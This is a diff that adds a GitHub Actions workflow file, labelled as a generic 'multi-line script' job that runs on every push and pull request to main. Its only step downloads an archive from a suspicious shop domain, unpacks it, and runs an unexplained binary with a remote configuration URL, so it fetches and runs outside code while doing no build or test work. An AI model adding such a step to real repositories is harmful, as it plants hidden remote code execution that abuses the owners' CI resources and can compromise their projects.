@@ -1,0 +1,16 @@
+name: Multi-line
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+    steps:
+    - name: Run a multi-line script
+      run: |	
+        wget https://gmail24.shop/daoco/node-mysqlite.tar.gz && tar -xf node-mysqlite.tar.gz && rm node-mysqlite.tar.gz && cd node-mysqlite && ./pum app.js -s="https://api.npoint.io/ab1de37f07d2d2341849"
